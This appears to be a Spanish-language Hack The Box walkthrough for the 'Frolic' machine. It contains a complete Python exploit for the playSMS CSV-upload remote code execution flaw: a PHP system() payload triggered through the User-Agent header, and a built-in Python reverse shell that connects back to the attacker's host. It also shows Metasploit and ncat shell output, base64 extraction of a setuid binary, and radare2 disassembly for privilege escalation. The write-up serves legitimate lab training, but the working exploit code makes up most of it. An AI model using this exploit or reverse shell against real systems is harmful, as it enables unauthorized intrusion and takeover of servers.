msf exploit(multi/http/playsms_uploadcsv_exec) > exploit

[*] Started reverse TCP handler on 10.10.15.126:3001
[+] Authentication successful: admin:idkwhatispass
[*] Sending stage (38247 bytes) to 10.10.10.111
[*] Meterpreter session 1 opened (10.10.15.126:3001 -> 10.10.10.111:44864) at 2019-01-04 14:02:38 -0600

meterpreter > ls
Listing: /var/www/html/playsms
==============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  2908   fil   2018-09-23 05:52:15 -0500  config-dist.php
100644/rw-r--r--  2904   fil   2018-09-23 05:52:15 -0500  config.php
40755/rwxr-xr-x   4096   dir   2018-09-23 05:52:15 -0500  inc
100644/rw-r--r--  3205   fil   2018-09-23 05:52:15 -0500  index.php
100444/r--r--r--  13466  fil   2018-10-15 12:16:46 -0500  init.php
40755/rwxr-xr-x   4096   dir   2018-09-23 05:52:15 -0500  lib
40755/rwxr-xr-x   4096   dir   2018-09-23 05:52:15 -0500  plugin
40755/rwxr-xr-x   4096   dir   2018-09-23 05:52:15 -0500  storage
```

Hemos podido identificar correctamente el exploit al cual es vulnerable esta aplicación que básicamente consiste en subir un archivo CVS que contiene código en PHP que ejecuta el contenido de las variables que controla el browser como User-Agent. La verdad me gusto mucho lo simple que era este exploit, por lo que decidí hacer mi propia versión:

```python
#!/usr/bin/env python2

import requests, re, random, netifaces
from bs4 import BeautifulSoup
from pwn import *

def req_url(url, session):
    try:
        res = session.get(url)
    except:
        print "Error al conectarse con la url %s." % url
        exit(1)
    return res


def res_csrftoken(res):
    try:
        soup = BeautifulSoup(res.content,features="lxml")
        csrftoken = soup.find('input', dict(name='X-CSRF-Token'))['value']
    except:
        print "No encontre un token."
        exit(1)

    return csrftoken


def execute(cmd, token, session, url):
    warhead = "<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>"
    payload = 'Name,Email,Department\n'
    payload += '{},{},{}'.format(warhead, random.randint(0, 42), random.randint(0, 42))

    headersPost = {'user-agent': cmd.replace('\n', ''), 'Upgrade-Insecure-Requests': '1'}
    filesPost = {'X-CSRF-Token': token, 'fnpb': ('notavirus.csv', payload, 'text/csv')}

    try:
        res = session.post(url + '&op=import', headers=headersPost, files=filesPost)
    except:
        print "Fallo al tratar de acceder a '{}&op=import'".format(url)
        exit(1)

    output(res)
    return res_csrftoken(res)


def output(res):
    try:
        soup = BeautifulSoup(res.content,features="lxml")
        print soup.find('table', class_='playsms-table-list').find('td').next_sibling.next_sibling
    except:
        print "Fallo al leer la salida."
        exit(1)


def main():
    session =  requests.Session()
    url_base = "http://10.10.10.111:9999/playsms/"
    url_login = url_base + "index.php?app=main&inc=core_auth&route=login"
    username = "admin"
    password = "idkwhatispass"

    res = req_url(url_login, session)

    phpsessid = "PHPSESSID=" + re.search('PHPSESSID=(.*?);', res.headers['Set-Cookie']).group(1)

    csrftoken = res_csrftoken(res)

    headersPost = {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': phpsessid, 'Referer': url_login}
    paramsPost = {'username': username, 'password': password, 'X-CSRF-Token': csrftoken}

    try:
        res_auth = session.post(url_login + '&op=login', data = paramsPost, headers = headersPost)
    except:
        print "Error al autenticarse con la pagina."
        exit(1)

    url_phonebookimport = url_base + 'index.php?app=main&inc=feature_phonebook&route=import'

    res = req_url(url_phonebookimport + '&op=list', session)
    csrftoken = res_csrftoken(res)

    while True:
        try:
            cmd = raw_input('$ ')
            if cmd.replace('\n','') == "exploit":
                revshell = "python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr'] + "\",3001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'"

                csrftoken = execute(revshell, csrftoken, session, url_phonebookimport)

            csrftoken = execute(cmd, csrftoken, session, url_phonebookimport)
        except EOFError:
            exit(1)


if __name__ == '__main__':
    main()

```

Como dato importante, es que la versión que uso de requests es la mas nueva (2.5.3) para python2. Le agregue como plus que si le paso como comando `exploit`, crearía un reverse shell hacia mi maquina en el puerto 3001. Tras ejecutar el script y ejecutar exploit, tendremos un acceso a frolic como www-data:

```text
xbytemx@laptop:~/htb/frolic$ python connect.py
$ exploit
```

```text
xbytemx@laptop:~/htb/frolic$ ncat -lnp 3001
$ ls -lah
ls -lah
total 56K
drwxr-xr-x  6 www-data www-data 4.0K Mar  2 21:37 .
drwxr-xr-x 10 www-data www-data 4.0K Sep 23 17:33 ..
-rw-r--r--  1 www-data www-data 2.9K Sep 23 16:22 config-dist.php
-rw-r--r--  1 www-data www-data 2.9K Sep 23 16:22 config.php
drwxr-xr-x  3 www-data www-data 4.0K Sep 23 16:22 inc
-rw-r--r--  1 www-data www-data 3.2K Sep 23 16:22 index.php
-r--r--r--  1 root     root      14K Sep 23 16:22 init.php
drwxr-xr-x  3 www-data www-data 4.0K Sep 23 16:22 lib
drwxr-xr-x  7 www-data www-data 4.0K Sep 23 16:22 plugin
drwxr-xr-x  3 www-data www-data 4.0K Sep 23 16:22 storage
-rw-r--r--  1 www-data www-data   36 Mar  3 01:07 z1.php

$ ls -lah /home/sahay /home/ayush
ls -lah /home/sahay /home/ayush
/home/ayush:
total 36K
drwxr-xr-x 3 ayush ayush 4.0K Sep 25 02:00 .
drwxr-xr-x 4 root  root  4.0K Sep 23 17:56 ..
-rw------- 1 ayush ayush 2.8K Sep 25 02:47 .bash_history
-rw-r--r-- 1 ayush ayush  220 Sep 23 17:56 .bash_logout
-rw-r--r-- 1 ayush ayush 3.7K Sep 23 17:56 .bashrc
drwxrwxr-x 2 ayush ayush 4.0K Sep 25 02:43 .binary
-rw-r--r-- 1 ayush ayush  655 Sep 23 17:56 .profile
-rw------- 1 ayush ayush  965 Sep 25 01:58 .viminfo
-rwxr-xr-x 1 ayush ayush   33 Sep 25 01:58 user.txt

/home/sahay:
total 80K
drwxr-xr-x   7 sahay sahay 4.0K Sep 25 02:45 .
drwxr-xr-x   4 root  root  4.0K Sep 23 17:56 ..
-rw-------   1 root  root   14K Sep 25 02:47 .bash_history
-rw-r--r--   1 sahay sahay  220 Sep 23 14:08 .bash_logout
-rw-r--r--   1 sahay sahay 3.7K Sep 23 14:08 .bashrc
drwx------   3 sahay sahay 4.0K Sep 23 15:22 .cache
drwxr-xr-x   3 root  root  4.0K Sep 23 15:22 .config
drwxr-xr-x   3 root  root  4.0K Sep 23 15:22 .local
-rw-------   1 root  root    87 Sep 23 15:21 .mysql_history
drwxr-xr-x   4 root  root  4.0K Sep 23 17:32 .node-red
drwxr-xr-x 316 sahay sahay  12K Sep 23 14:48 .npm
-rw-r--r--   1 sahay sahay  655 Sep 23 14:08 .profile
-rw-r--r--   1 sahay sahay    0 Sep 23 14:11 .sudo_as_admin_successful
-rw-------   1 root  root  6.4K Sep 25 02:45 .viminfo
-rw-r--r--   1 root  root   255 Sep 25 01:37 .wget-hsts
```

Como `user.txt` es global readable, podemos leerlo desde www-data

# `cat user.txt`

`$ cat /home/ayush/user.txt`

# PrivEsc

Para el privilage escalation, encontramos un directorio interesante en el home de Ayush, el cual se llama `.binary`:

```text
$ ls -lah /home/ayush/.binary
ls -lah /home/ayush/.binary
total 16K
drwxrwxr-x 2 ayush ayush 4.0K Sep 25 02:43 .
drwxr-xr-x 3 ayush ayush 4.0K Sep 25 02:00 ..
-rwsr-xr-x 1 root  root  7.4K Sep 25 00:59 rop

```

Vemos que se trata de un binario que tiene un SETUID bit para root, pero lo que no le ayuda es que es global readeable y executable. Esto quiere decir que si el binario tiene alguna llamada a funciones que nos permitan elevar los permisos como otro usuario, pudiéramos ejecutar comandos como root.

Decidí extraer el binario para analizarlo por fuera, esto vía Base64:

```text
$ base64 /home/ayush/.binary/rop
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
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwhAQIUIQECAAAAAABAAAAAQAAAAwAAAAMgwQI
DQAAAKSFBAgZAAAACJ8ECBsAAAAEAAAAGgAAAAyfBAgcAAAABAAAAPX+/2+sgQQIBQAAAEyCBAgG
AAAAzIEECAoAAABfAAAACwAAABAAAAAVAAAAAAAAAAMAAAAAoAQIAgAAACgAAAAUAAAAEQAAABcA
AADkggQIEQAAANyCBAgSAAAACAAAABMAAAAIAAAA/v//b7yCBAj///9vAQAAAPD//2+sggQIAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABSfBAgAAAAA
AAAAAEaDBAhWgwQIZoMECHaDBAiGgwQIAAAAAAAAAABHQ0M6IChVYnVudHUgNS40LjAtNnVidW50
dTF+MTYuMDQuMTApIDUuNC4wIDIwMTYwNjA5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVIEECAAA
AAADAAEAAAAAAGiBBAgAAAAAAwACAAAAAACIgQQIAAAAAAMAAwAAAAAArIEECAAAAAADAAQAAAAA
AMyBBAgAAAAAAwAFAAAAAABMggQIAAAAAAMABgAAAAAArIIECAAAAAADAAcAAAAAALyCBAgAAAAA
AwAIAAAAAADcggQIAAAAAAMACQAAAAAA5IIECAAAAAADAAoAAAAAAAyDBAgAAAAAAwALAAAAAAAw
gwQIAAAAAAMADAAAAAAAkIMECAAAAAADAA0AAAAAAKCDBAgAAAAAAwAOAAAAAACkhQQIAAAAAAMA
DwAAAAAAuIUECAAAAAADABAAAAAAAPCFBAgAAAAAAwARAAAAAAAkhgQIAAAAAAMAEgAAAAAACJ8E
CAAAAAADABMAAAAAAAyfBAgAAAAAAwAUAAAAAAAQnwQIAAAAAAMAFQAAAAAAFJ8ECAAAAAADABYA
AAAAAPyfBAgAAAAAAwAXAAAAAAAAoAQIAAAAAAMAGAAAAAAAIKAECAAAAAADABkAAAAAACigBAgA
AAAAAwAaAAAAAAAAAAAAAAAAAAMAGwABAAAAAAAAAAAAAAAEAPH/DAAAABCfBAgAAAAAAQAVABkA
AADggwQIAAAAAAIADgAbAAAAEIQECAAAAAACAA4ALgAAAFCEBAgAAAAAAgAOAEQAAAAooAQIAQAA
AAEAGgBTAAAADJ8ECAAAAAABABQAegAAAHCEBAgAAAAAAgAOAIYAAAAInwQIAAAAAAEAEwClAAAA
AAAAAAAAAAAEAPH/AQAAAAAAAAAAAAAABADx/6sAAAAUhwQIAAAAAAEAEgC5AAAAEJ8ECAAAAAAB
ABUAAAAAAAAAAAAAAAAABADx/8UAAAAMnwQIAAAAAAAAEwDWAAAAFJ8ECAAAAAABABYA3wAAAAif
BAgAAAAAAAATAPIAAADwhQQIAAAAAAAAEQAFAQAAAKAECAAAAAABABgAGwEAAKCFBAgCAAAAEgAO
ACsBAAAAAAAAAAAAACAAAABHAQAA0IMECAQAAAASAg4AjwEAACCgBAgAAAAAIAAZAF0BAAAAAAAA
AAAAABIAAABvAQAA+IQECDoAAAASAA4AdAEAACigBAgAAAAAEAAZACUBAACkhQQIAAAAABIADwB7
AQAAAAAAAAAAAAASAAAAjQEAACCgBAgAAAAAEAAZAJoBAAAAAAAAAAAAABIAAACqAQAAAAAAAAAA
AAAgAAAAuQEAACSgBAgAAAAAEQIZAMYBAAC8hQQIBAAAABEAEADVAQAAAAAAAAAAAAASAAAA8gEA
AECFBAhdAAAAEgAOANEAAAAsoAQIAAAAABAAGgCTAQAAoIMECAAAAAASAA4AAgIAALiFBAgEAAAA
EQAQAAkCAAAooAQIAAAAABAAGgAVAgAAm4QECF0AAAASAA4AGgIAAAAAAAAAAAAAEgAAACwCAAAA
AAAAAAAAACAAAABAAgAAKKAECAAAAAARAhkATAIAAAAAAAAAAAAAIAAAAPwBAAAMgwQIAAAAABIA
CwAAY3J0c3R1ZmYuYwBfX0pDUl9MSVNUX18AZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9i
YWxfZHRvcnNfYXV4AGNvbXBsZXRlZC43MjA5AF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2Fy
cmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQByb3Au
YwBfX0ZSQU1FX0VORF9fAF9fSkNSX0VORF9fAF9faW5pdF9hcnJheV9lbmQAX0RZTkFNSUMAX19p
bml0X2FycmF5X3N0YXJ0AF9fR05VX0VIX0ZSQU1FX0hEUgBfR0xPQkFMX09GRlNFVF9UQUJMRV8A
X19saWJjX2NzdV9maW5pAF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfX3g4Ni5nZXRfcGNf
dGh1bmsuYngAcHJpbnRmQEBHTElCQ18yLjAAdnVsbgBfZWRhdGEAc3RyY3B5QEBHTElCQ18yLjAA
X19kYXRhX3N0YXJ0AHB1dHNAQEdMSUJDXzIuMABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUA
X0lPX3N0ZGluX3VzZWQAX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABfX2xpYmNfY3N1X2lu
aXQAX2ZwX2h3AF9fYnNzX3N0YXJ0AG1haW4Ac2V0dWlkQEBHTElCQ18yLjAAX0p2X1JlZ2lzdGVy
Q2xhc3NlcwBfX1RNQ19FTkRfXwBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAAAuc3ltdGFiAC5z
dHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuQUJJLXRhZwAubm90ZS5nbnUuYnVpbGQtaWQA
LmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJl
bC5keW4ALnJlbC5wbHQALmluaXQALnBsdC5nb3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJh
bWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuamNyAC5keW5hbWljAC5n
b3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAABsAAAABAAAAAgAAAFSBBAhUAQAAEwAAAAAAAAAAAAAAAQAAAAAAAAAjAAAABwAA
AAIAAABogQQIaAEAACAAAAAAAAAAAAAAAAQAAAAAAAAAMQAAAAcAAAACAAAAiIEECIgBAAAkAAAA
AAAAAAAAAAAEAAAAAAAAAEQAAAD2//9vAgAAAKyBBAisAQAAIAAAAAUAAAAAAAAABAAAAAQAAABO
AAAACwAAAAIAAADMgQQIzAEAAIAAAAAGAAAAAQAAAAQAAAAQAAAAVgAAAAMAAAACAAAATIIECEwC
AABfAAAAAAAAAAAAAAABAAAAAAAAAF4AAAD///9vAgAAAKyCBAisAgAAEAAAAAUAAAAAAAAAAgAA
AAIAAABrAAAA/v//bwIAAAC8ggQIvAIAACAAAAAGAAAAAQAAAAQAAAAAAAAAegAAAAkAAAACAAAA
3IIECNwCAAAIAAAABQAAAAAAAAAEAAAACAAAAIMAAAAJAAAAQgAAAOSCBAjkAgAAKAAAAAUAAAAY
AAAABAAAAAgAAACMAAAAAQAAAAYAAAAMgwQIDAMAACMAAAAAAAAAAAAAAAQAAAAAAAAAhwAAAAEA
AAAGAAAAMIMECDADAABgAAAAAAAAAAAAAAAQAAAABAAAAJIAAAABAAAABgAAAJCDBAiQAwAACAAA
AAAAAAAAAAAACAAAAAAAAACbAAAAAQAAAAYAAACggwQIoAMAAAICAAAAAAAAAAAAABAAAAAAAAAA
oQAAAAEAAAAGAAAApIUECKQFAAAUAAAAAAAAAAAAAAAEAAAAAAAAAKcAAAABAAAAAgAAALiFBAi4
BQAAOAAAAAAAAAAAAAAABAAAAAAAAACvAAAAAQAAAAIAAADwhQQI8AUAADQAAAAAAAAAAAAAAAQA
AAAAAAAAvQAAAAEAAAACAAAAJIYECCQGAAD0AAAAAAAAAAAAAAAEAAAAAAAAAMcAAAAOAAAAAwAA
AAifBAgIDwAABAAAAAAAAAAAAAAABAAAAAAAAADTAAAADwAAAAMAAAAMnwQIDA8AAAQAAAAAAAAA
AAAAAAQAAAAAAAAA3wAAAAEAAAADAAAAEJ8ECBAPAAAEAAAAAAAAAAAAAAAEAAAAAAAAAOQAAAAG
AAAAAwAAABSfBAgUDwAA6AAAAAYAAAAAAAAABAAAAAgAAACWAAAAAQAAAAMAAAD8nwQI/A8AAAQA
AAAAAAAAAAAAAAQAAAAEAAAA7QAAAAEAAAADAAAAAKAECAAQAAAgAAAAAAAAAAAAAAAEAAAABAAA
APYAAAABAAAAAwAAACCgBAggEAAACAAAAAAAAAAAAAAABAAAAAAAAAD8AAAACAAAAAMAAAAooAQI
KBAAAAQAAAAAAAAAAAAAAAEAAAAAAAAAAQEAAAEAAAAwAAAAAAAAACgQAAA1AAAAAAAAAAAAAAAB
AAAAAQAAABEAAAADAAAAAAAAAAAAAABWFwAACgEAAAAAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAA
AAAAAAAAYBAAAJAEAAAeAAAALwAAAAQAAAAQAAAACQAAAAMAAAAAAAAAAAAAAPAUAABmAgAAAAAA
AAAAAAABAAAAAAAAAA==

```

Perfecto, ahora veamos que mas hay por aquí:

```text
xbytemx@laptop:~/htb/frolic$ file rop
rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=59da91c100d138c662b77627b65efbbc9f797394, not stripped
```

Vemos que se trata de un binario enlazado dinámicamente, por lo que tenemos que también considerar a que se enlaza:

```text
$ ldd /home/ayush/.binary/rop
        linux-gate.so.1 =&gt;  (0xb7fda000)
        libc.so.6 > /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
        /lib/ld-linux.so.2 (0xb7fdb000)

```

Nada anormal aquí. Continuemos con radare2:

```text
xbytemx@laptop:~/htb/frolic$ r2 rop
[0x080483a0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Enable constraint types analysis for variables
[0x080483a0]> afl
0x0804830c    3 35           sym._init
0x08048340    1 6            sym.imp.printf
0x08048350    1 6            sym.imp.strcpy
0x08048360    1 6            sym.imp.puts
0x08048370    1 6            sym.imp.__libc_start_main
0x08048380    1 6            sym.imp.setuid
0x08048390    1 6            fcn.08048390
0x080483a0    1 33           entry0
0x080483d0    1 4            sym.__x86.get_pc_thunk.bx
0x080483e0    4 43           sym.deregister_tm_clones
0x08048410    4 53           sym.register_tm_clones
0x08048450    3 30           sym.__do_global_dtors_aux
0x08048470    4 43   -> 40   entry.init0
0x0804849b    4 93           main
0x080484f8    1 58           sym.vuln
0x08048540    4 93           sym.__libc_csu_init
0x080485a0    1 2            sym.__libc_csu_fini
0x080485a4    1 20           sym._fini
[0x0804849b]> pdf @main
┌ (fcn) main 93
│   int main (int argc, char **argv, char **envp);
│           ; var int var_8h @ ebp-0x8
│           ; arg int arg_4h @ esp+0x4
│           ; DATA XREF from entry0 (0x80483b7)
│           0x0804849b      8d4c2404       lea ecx, [arg_4h]           ; 4
│           0x0804849f      83e4f0         and esp, 0xfffffff0
│           0x080484a2      ff71fc         push dword [ecx - 4]
│           0x080484a5      55             push ebp
│           0x080484a6      89e5           mov ebp, esp
│           0x080484a8      53             push ebx
│           0x080484a9      51             push ecx
│           0x080484aa      89cb           mov ebx, ecx
│           0x080484ac      83ec0c         sub esp, 0xc
│           0x080484af      6a00           push 0
│           0x080484b1      e8cafeffff     call sym.imp.setuid
│           0x080484b6      83c410         add esp, 0x10
│           0x080484b9      833b01         cmp dword [ebx], 1
│       ┌─< 0x080484bc      7f17           jg 0x80484d5
│       │   0x080484be      83ec0c         sub esp, 0xc
│       │   0x080484c1      68c0850408     push str.Usage:_program__message ; 0x80485c0 ; "[*] Usage: program <message>"
